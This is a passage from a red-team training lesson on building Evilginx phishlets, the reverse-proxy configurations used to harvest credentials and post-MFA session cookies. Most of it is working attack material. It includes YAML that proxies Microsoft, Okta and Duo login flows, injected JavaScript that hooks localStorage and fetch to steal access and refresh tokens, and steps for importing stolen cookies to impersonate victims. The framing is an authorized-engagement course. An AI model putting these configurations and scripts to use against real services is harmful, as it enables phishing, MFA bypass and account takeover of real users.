    domain: 'company.com'
    session: true
    is_landing: true

  - phish_sub: 'adfs'
    orig_sub: 'adfs'
    domain: 'company.com'
    session: true
    is_landing: false

  - phish_sub: 'login-ms'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
    is_landing: false

  - phish_sub: 'aadcdn'
    orig_sub: 'aadcdn'
    domain: 'msftauth.net'
    session: false
    is_landing: false
```

Critical sub_filters for SAML flows must also handle XML MIME types:

```yaml
sub_filters:
  - triggers_on: 'adfs.company.com'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/xml', 'text/xml']

  # SAML assertions may contain encoded URLs
  - triggers_on: 'adfs.company.com'
    orig_sub: 'app'
    domain: 'company.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/xml']
```

### 5.2 MFA Bypass via Session Token Capture

Evilginx does not "bypass" MFA in the traditional sense. The victim still completes MFA. The bypass occurs because Evilginx captures the **post-MFA session tokens** -- the cookies that represent a fully authenticated session.

The key is ensuring your `auth_urls` trigger **after** MFA completion, not after just the password step.

```yaml
# WRONG: Triggers after password but before MFA
auth_urls:
  - '/login/password-success'

# CORRECT: Triggers only after full authentication (password + MFA)
auth_urls:
  - '/app/dashboard'
  - '/oauth2/token\?code=:regexp'
```

To use captured tokens:

1. Wait for the session to show status "authenticated" in Evilginx.
2. Export the cookies.
3. Import them into your browser using a cookie editor extension.
4. Navigate to the target application -- you are now logged in as the victim, with MFA already completed.

**Time sensitivity:** Many session tokens have short lifetimes (15 minutes to several hours). Act quickly after capture. If the target uses refresh tokens, capture those too (`:always` modifier).

### 5.3 CAPTCHA Handling

Some login pages include CAPTCHAs. Evilginx handles this naturally because:

- The CAPTCHA is rendered from the real server.
- The victim solves it themselves (they think they are on the real site).
- The solution is submitted through Evilginx like any other POST request.

However, watch out for:

- **reCAPTCHA/hCaptcha domain validation:** These services may validate that the domain serving the CAPTCHA matches the registered domain. This can break the CAPTCHA. Solutions:
  - Use `js_inject` to modify the CAPTCHA initialization to use the real domain.
  - Some CAPTCHAs check `window.location` -- override it with injected JS.

```yaml
js_inject:
  - trigger_domains: ['auth.targetcorp.com']
    trigger_paths: ['/login:regexp']
    trigger_params: []
    script: |
      // Override location properties for CAPTCHA domain validation
      Object.defineProperty(window, '__captcha_origin', {
        value: 'https://auth.targetcorp.com',
        writable: false
      });
```

- **Invisible CAPTCHAs (reCAPTCHA v3):** These score user behavior. They usually work through the proxy without issues since the victim's behavior is normal.

### 5.4 Single-Page Application (SPA) Phishing

SPAs present unique challenges:

1. **Client-side routing:** The URL changes without full page loads, so Evilginx cannot intercept server-side redirects.
2. **Token storage in localStorage/sessionStorage:** Not captured by cookie-based auth_tokens.
3. **API-first auth:** Credentials submitted via `fetch()` as JSON, not form POST.
4. **WebSocket connections:** Some SPAs use WebSockets that need proxying.

**Strategy for SPAs:**

```yaml
# Use JSON credential type for API submissions
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'json'
  password:
    key: 'password'
    search: '(.*)'
    type: 'json'

# Inject JavaScript to capture localStorage tokens
js_inject:
  - trigger_domains: ['app.targetcorp.com']
    trigger_paths: ['/.*:regexp']
    trigger_params: []
    script: |
      // Monitor localStorage for auth tokens
      const originalSetItem = Storage.prototype.setItem;
      Storage.prototype.setItem = function(key, value) {
        if (key === 'access_token' || key === 'auth_token') {
          // Send token to a collection endpoint
          fetch('/collect-token', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({key: key, value: value})
          });
        }
        return originalSetItem.apply(this, arguments);
      };
```

### 5.5 API-Based Authentication

Some targets authenticate entirely via API endpoints, returning JWTs or opaque tokens:

```
POST /api/v1/auth/login
Content-Type: application/json
{"email": "user@corp.com", "password": "secret"}

Response:
{"access_token": "eyJhbG...", "refresh_token": "dGhpcyBp..."}
```

For these flows:

1. Set credential `type` to `json`.
2. Use `js_inject` to intercept the API response and store the tokens as cookies (which Evilginx can then capture).
3. Set `auth_urls` to the API endpoint path.

```yaml
js_inject:
  - trigger_domains: ['app.targetcorp.com']
    trigger_paths: ['/.*:regexp']
    trigger_params: []
    script: |
      const origFetch = window.fetch;
      window.fetch = async function(url, opts) {
        const resp = await origFetch(url, opts);
        if (url.includes('/api/v1/auth/login')) {
          const clone = resp.clone();
          const data = await clone.json();
          if (data.access_token) {
            // Store as cookie so Evilginx can capture it
            document.cookie = 'captured_at=' + data.access_token +
              '; path=/; domain=' + window.location.hostname;
            document.cookie = 'captured_rt=' + data.refresh_token +
              '; path=/; domain=' + window.location.hostname;
          }
        }
        return resp;
      };
```

Then capture the artificial cookies:

```yaml
auth_tokens:
  - domain: '.evil.example.com'
    keys:
      - 'captured_at'
      - 'captured_rt'
```

### 5.6 Multi-Domain Authentication Chains

Complex enterprise environments may chain multiple identity providers:

```
app.company.com -> idp.company.com -> okta.com -> duo.com (MFA) -> back to app
```

The approach:

1. **Map every redirect** in the chain.
2. **Add all domains** to `proxy_hosts`.
3. **Create cross-domain sub_filters** for every pair.
4. **Set auth_urls** to the final destination after all redirects complete.
5. **Capture auth_tokens** from every domain that sets session cookies.

```yaml
proxy_hosts:
  - phish_sub: 'app'
    orig_sub: 'app'
    domain: 'company.com'
    session: true
    is_landing: true

  - phish_sub: 'idp'
    orig_sub: 'idp'
    domain: 'company.com'
    session: true
    is_landing: false

  - phish_sub: 'sso'
    orig_sub: 'company'
    domain: 'okta.com'
    session: true
    is_landing: false

  - phish_sub: 'mfa'
    orig_sub: 'api-company'
    domain: 'duosecurity.com'
    session: true
    is_landing: false

auth_tokens:
  - domain: '.company.com'
    keys:
      - 'session_id'
      - 'sso_token'

  - domain: '.okta.com'
    keys:
      - 'sid'
      - 'okta-oauth-nonce:opt'

  - domain: '.duosecurity.com'
    keys:
      - 'duo_session:opt'

auth_urls:
  - '/app/dashboard'
```

---

## 6. Common Mistakes

These are the errors most frequently encountered when building phishlets. Learning to recognize them will save you hours of debugging.

### 6.1 Missing Subdomains

**Symptom:** The login page loads but is visually broken, missing styles, images, or scripts. Or the login form submits but nothing happens.

**Cause:** You did not include a CDN, API, or asset domain in `proxy_hosts`. The browser fetches those resources from the real domain directly, which may fail due to CORS or simply reveal the real domain in DevTools.

**Fix:** Use DevTools Network tab to identify ALL domains contacted during login. Add every one to `proxy_hosts`:

```yaml
# Commonly missed domains:
# - CDN domains (static assets)
# - Font domains (fonts.googleapis.com)
# - Analytics domains (if they set cookies used in auth)
# - API subdomains
# - Regional/geo-balanced subdomains
```

### 6.2 Wrong Cookies in auth_tokens

**Symptom:** Session shows as "authenticated" in Evilginx but importing the captured cookies does not give you a valid session.

**Cause:** You captured the wrong cookies. Perhaps you captured only transient cookies (e.g., CSRF tokens) but missed the actual session cookie. Or the cookie domain was wrong.

**Fix:** Log into the target and systematically delete cookies one at a time. When deleting a cookie causes the session to die, that cookie is essential. Make sure you have it in `auth_tokens` with the correct domain.

```yaml
# Common auth cookie names to check:
# - session, session_id, sess_id
# - JSESSIONID (Java)
# - ASP.NET_SessionId (.NET)
# - connect.sid (Node.js Express)
# - laravel_session (Laravel)
# - _session_id (Rails)
# - PHPSESSID (PHP)
# - auth_token, access_token
# - sid, ssid
```

### 6.3 No Cross-Domain sub_filter Replacement

**Symptom:** The login page loads correctly but clicking "Sign In" navigates to the real domain instead of staying on the phishing domain. Or API calls fail with CORS errors.

**Cause:** JavaScript loaded from domain A contains hardcoded references to domain B, and you did not add a sub_filter for that combination.

**Fix:** For every `proxy_host`, check which other domains it references. Create cross-domain sub_filters:

```yaml
# If auth.acmecorp.com's JavaScript references api.acmecorp.com:
sub_filters:
  - triggers_on: 'auth.acmecorp.com'
    orig_sub: 'api'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']
```

### 6.4 Incorrect Login Path

**Symptom:** The lure URL leads to a 404 page, or it loads the target's home page instead of the login page.

**Cause:** The `login.path` does not match the actual login page URL.

**Fix:** Verify the exact path by navigating to the login page and copying the path from the URL bar. Watch for:

- Query parameters that are required (e.g., `/authorize?client_id=abc&response_type=code`)
- Hash fragments for SPA routing (e.g., `/#!/login`)
- Redirects that change the path

```yaml
# Verify the exact path:
login:
  domain: 'acmecorp.com'
  path: '/oauth2/authorize?client_id=app123&response_type=code&redirect_uri=https://portal.acmecorp.com/callback'
```

### 6.5 Missing force_post Rules

**Symptom:** Login fails with a "redirect_uri mismatch" error, or the server rejects the POST with a 400/403.

**Cause:** The POST body contains the phishing domain in a `redirect_uri` or similar field, and the server validates it against the real domain.

**Fix:** Add `force_post` rules to rewrite the offending parameter:

```yaml
force_post:
  - path: '/oauth2/authorize'
    search:
      - key: 'redirect_uri'
        search: 'evil\.example\.com'
        replace: 'acmecorp.com'
        mimes: ['application/x-www-form-urlencoded']
```

### 6.6 auth_urls Triggering Too Early

**Symptom:** Session marked as authenticated after the password step, before MFA completion. Captured tokens are incomplete/invalid.

**Cause:** `auth_urls` matches a URL that occurs between password and MFA, not after full authentication.

**Fix:** Set `auth_urls` to match only URLs that appear after the complete authentication flow:

```yaml
# Wrong -- this URL appears right after password, before MFA
auth_urls:
  - '/mfa/challenge'

# Correct -- this URL only appears after full auth completion
auth_urls:
  - '/app/home'
```

### 6.7 MIME Type Omissions in sub_filters

**Symptom:** Some domain references are not rewritten, even though the sub_filter exists.

**Cause:** The response has a MIME type (e.g., `application/json`) that is not in the sub_filter's `mimes` array.

**Fix:** Include all relevant MIME types. When in doubt, add `application/json` -- modern apps heavily use JSON API responses that contain URLs.

---

## 7. Testing Methodology

Systematic testing is essential. A phishlet that "mostly works" will fail during the engagement at the worst possible moment.

### 7.1 Debug Mode

Always start with Evilginx in debug/developer mode to see detailed logging:

```bash
# Start Evilginx with debug output
./evilginx -debug

# Or increase verbosity
./evilginx -debug -developer
```

Debug mode shows:

- Every proxied request and response.
- Which sub_filters matched and what was replaced.
- Cookie capture events.
- Credential extraction events.
- Auth URL matches.

### 7.2 Step-by-Step Proxy Log Analysis

When testing, follow each step of the login flow and verify in the logs:

1. **Initial page load:** Verify the login page HTML is proxied correctly. Check that all sub_filters fired and domain references were replaced.

2. **Asset loading:** Verify CSS, JS, and images load from the phishing domain (not the real domain). Check for mixed-content or CORS errors in the browser console.

3. **Credential submission:** Verify the POST is intercepted, credentials are extracted, and the request is forwarded. Check the log for:
   ```
   [credential] captured username: user@acmecorp.com
   [credential] captured password: ********
   ```

4. **Redirect chain:** Verify each redirect in the auth flow is properly rewritten. A single unrewritten redirect breaks the entire flow.

5. **Auth detection:** Verify `auth_urls` triggers at the right time (after MFA, not before).

6. **Token capture:** Verify all expected cookies appear in the session.

### 7.3 Certificate Validation

Before testing with a real browser, verify certificates are provisioned:

```bash
# In Evilginx console:
phishlets enable acmecorp

# Watch the output for certificate provisioning
# You should see "successfully obtained certificate" for each proxy_host
```

Common certificate issues:

- **DNS not configured:** The ACME challenge fails because the domain does not resolve to your server.
- **Port 80 blocked:** Let's Encrypt needs port 80 for HTTP-01 challenge.
- **Rate limiting:** Too many certificate requests to Let's Encrypt in a short period.

### 7.4 Browser Testing Checklist

Test in a real browser (not just curl) because JavaScript execution matters:

```
[ ] Login page loads without visual errors
[ ] No browser console errors related to CORS or mixed content
[ ] All requests in Network tab go through the phishing domain (no direct calls to real domain)
[ ] Username/email field submission works (multi-step login first page)
[ ] Password field submission works (multi-step login second page)
[ ] MFA prompt appears and functions correctly
[ ] After MFA, redirect chain completes successfully
[ ] Final landing page (dashboard/app) loads correctly
[ ] Evilginx shows session as "authenticated"
[ ] All expected auth_tokens are captured
[ ] Credentials are captured correctly
[ ] Importing captured cookies into a clean browser grants authenticated access
```

### 7.5 Common Error Messages and Fixes

| Error | Likely Cause | Fix |
|-------|-------------|-----|
| `ERR_NAME_NOT_RESOLVED` | DNS not configured for this subdomain | Add A record for the subdomain |
| `ERR_CERT_AUTHORITY_INVALID` | Certificate not provisioned | Check `phishlets enable` output; verify DNS |
| `ERR_TOO_MANY_REDIRECTS` | Redirect loop between phishing and real domain | Check sub_filters for missing cross-domain replacements |
| `403 Forbidden` on POST | Server rejecting request with phishing domain | Add `force_post` rules for the affected parameter |
| Page loads but appears blank | JavaScript error due to unreplaced domain | Check browser console; add missing sub_filters |
| `CORS error` in console | Cross-origin request to unrewritten domain | Add the domain to `proxy_hosts` and create sub_filters |
| Cookies not captured | Wrong domain in `auth_tokens` | Check cookie domain with DevTools; use leading dot for root domain |
| Session stays "waiting" | `auth_urls` never matches | Verify the post-auth URL matches your pattern; use `:regexp` if needed |

### 7.6 Automated Testing with curl

For quick validation without a full browser:

```bash
# Test that the phishing domain responds
curl -k -I https://portal.evil.example.com/login

# Verify the response contains rewritten domains
curl -k -s https://portal.evil.example.com/login | grep -c "evil.example.com"

# Check that the real domain does NOT appear
curl -k -s https://portal.evil.example.com/login | grep -c "acmecorp.com"
# This should return 0 (no matches)
```

---

## 8. Best Practices

### 8.1 Version Pinning with min_ver

Always set `min_ver` to the minimum Evilginx version that supports all features you use:

```yaml
# If you use js_inject (added in 3.2.0)
min_ver: '3.2.0'

# If you use features from a newer release
min_ver: '3.3.0'
```

This prevents confusing errors when someone tries to load your phishlet on an older version.

### 8.2 Comment Your Phishlet

YAML supports comments. Use them generously. Future you (or a teammate) will thank you:

```yaml
proxy_hosts:
  # Main application portal - entry point for lure
  - phish_sub: 'portal'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    session: true
    is_landing: true

  # Identity provider - handles username/password and MFA
  # NOTE: This domain also sets the primary session cookie
  - phish_sub: 'auth'
    orig_sub: 'auth'
    domain: 'acmecorp.com'
    session: true
    is_landing: false

auth_tokens:
  - domain: '.acmecorp.com'
    keys:
      - 'session_id'        # Primary session cookie - required
      - 'csrf_token'        # CSRF token - required for POST requests
      - 'remember_me:opt'   # Optional - only set if "Remember me" is checked
```

### 8.3 Isolated Testing Environment

Never test phishlets against production targets from your engagement network. Use an isolated setup:

1. **Separate VPS** for testing, distinct from your engagement infrastructure.
2. **Test against a staging/dev instance** of the target if possible.
3. **Use a throwaway phishing domain** for testing, not your engagement domain (to avoid domain reputation burn).
4. **Monitor for detection** -- some targets log and alert on proxy signatures.

### 8.4 Keep Phishlets Updated

Web applications change. A phishlet that worked last month may break because:

- The target added a new subdomain or CDN.
- Cookie names changed.
- The login flow added a new step (e.g., device trust prompt).
- JavaScript was updated with new domain references.
- The target deployed anti-phishing measures.

**Before every engagement**, re-test your phishlet against the current state of the target.

### 8.5 Use auto_filter When Available

Evilginx v3 supports `auto_filter` which automatically rewrites some domain references without explicit sub_filters:

```yaml
# Evilginx will automatically create basic sub_filters
# But explicit sub_filters give you more control and are more reliable
# Use auto_filter as a supplement, not a replacement
```

Even with auto_filter, explicit sub_filters for critical domains are recommended. Auto_filter may miss edge cases like:

- Encoded domain references (URL-encoded, base64, etc.).
- Domain references in JavaScript string concatenation.
- Domain references in inline JSON data.

### 8.6 Include All Subdomains -- Even If You Think They Are Not Needed

When in doubt, include the subdomain. The cost of including an extra `proxy_host` is one more DNS record and one more TLS certificate. The cost of missing one is a broken phishlet.

Common domains people forget:

```yaml
# Static asset CDN
- phish_sub: 'cdn'
  orig_sub: 'cdn'
  domain: 'targetassets.com'
  session: false
  is_landing: false

# Font/resource CDN
- phish_sub: 'fonts'
  orig_sub: 'fonts'
  domain: 'googleapis.com'
  session: false
  is_landing: false

# Telemetry/analytics (if it affects the login flow)
- phish_sub: 'telemetry'
  orig_sub: 'telemetry'
  domain: 'targetcorp.com'
  session: false
  is_landing: false

# WebSocket endpoint
- phish_sub: 'ws'
  orig_sub: 'ws'
  domain: 'targetcorp.com'
  session: false
  is_landing: false
```

### 8.7 Token Capture Completeness

Capture more cookies than you think you need. It is far better to have extra cookies than to miss one that turns out to be essential:

```yaml
auth_tokens:
  - domain: '.targetcorp.com'
    keys:
      # Capture everything that looks authentication-related
      - 'sess.*:regexp'
      - 'auth.*:regexp'
      - 'token.*:regexp'
      - 'csrf.*:regexp:opt'
      - 'XSRF.*:regexp:opt'
      - '__Host-.*:regexp:opt'
      - '__Secure-.*:regexp:opt'
```

Use the `:regexp` modifier to catch cookie name variations, and `:opt` for cookies that may not always be set.

### 8.8 Phishlet File Organization

For engagements with multiple targets, organize your phishlets:

```
phishlets/
  acmecorp.yaml           # Main corporate portal
  acmecorp-vpn.yaml       # VPN portal (different login flow)
  acmecorp-email.yaml     # Webmail (OWA/Exchange)
  acmecorp-sso.yaml       # SSO IdP directly
```

Each phishlet should target one specific login flow. Do not try to combine multiple flows into a single phishlet.

### 8.9 Operational Security Considerations

When using phishlets in authorized engagements:

- **Domain categorization:** Use aged domains that are categorized as business/technology, not newly registered.
- **TLS fingerprinting:** Evilginx's TLS fingerprint differs from standard web servers. Some advanced defenses detect this.
- **DNS OPSEC:** Do not reuse phishing domains across engagements.
- **Log handling:** Evilginx logs contain credentials. Handle them with the same care as any sensitive data. Encrypt at rest and in transit.
- **Cleanup:** After the engagement, disable phishlets, destroy the VPS, and securely delete all captured data per your engagement agreement.

### 8.10 When Automation Helps and When It Does Not

Use RTLPhishletGenerator or similar automation tools for:

- Initial reconnaissance (discovering domains, cookies, login flows).
- Generating a baseline phishlet as a starting point.
- Validation (checking for structural errors in your YAML).

Do manual work for:

- Fine-tuning sub_filters for edge cases.
- Handling federated/chained authentication.
- Adding js_inject for SPA targets.
- Debugging failures that automation cannot diagnose.
- Adapting to non-standard or custom login flows.

The best workflow is: **automate the baseline, manually refine, test thoroughly.**

---

## Summary

Creating effective phishlets requires a systematic approach:

1. **Reconnaissance first** -- understand every domain, redirect, cookie, and form field in the login flow.
2. **proxy_hosts for every domain** -- miss one and the phishlet breaks.
3. **sub_filters as a matrix** -- every response source times every referenced domain.
4. **auth_tokens after MFA** -- capture the post-MFA session cookies, not the intermediate ones.
5. **Test exhaustively** -- use debug mode, check every step, verify in a real browser.
6. **Iterate** -- phishlets rarely work perfectly on the first try. Debug, fix, retest.

The difference between a novice and expert phishlet author is not knowledge of the YAML format -- it is the ability to diagnose why a login flow breaks and fix it methodically. That skill comes only from practice.

---

## Lab Exercise

**Objective:** Build a phishlet from scratch for a practice target.

1. Set up Evilginx on a test VPS.
2. Choose a target application from your authorized lab environment.
3. Perform complete login flow reconnaissance using browser DevTools.
4. Write the phishlet YAML by hand, following the 8-step process in Section 4.
5. Test the phishlet and debug any issues using the methodology in Section 7.
6. Verify that credentials and session tokens are captured correctly.
7. Import the captured tokens into a clean browser and confirm authenticated access.

**Success criteria:** You have a working phishlet that captures both credentials and post-MFA session tokens, allowing you to access the target application as the victim.

---

> **Next Lesson:** Advanced Evilginx Deployment -- infrastructure setup, domain fronting, redirector chains, and evasion techniques.

---

*This document is part of the Red Team Phishing and Adversary Simulation course. All techniques described must only be used in authorized engagements with proper legal agreements in place.*
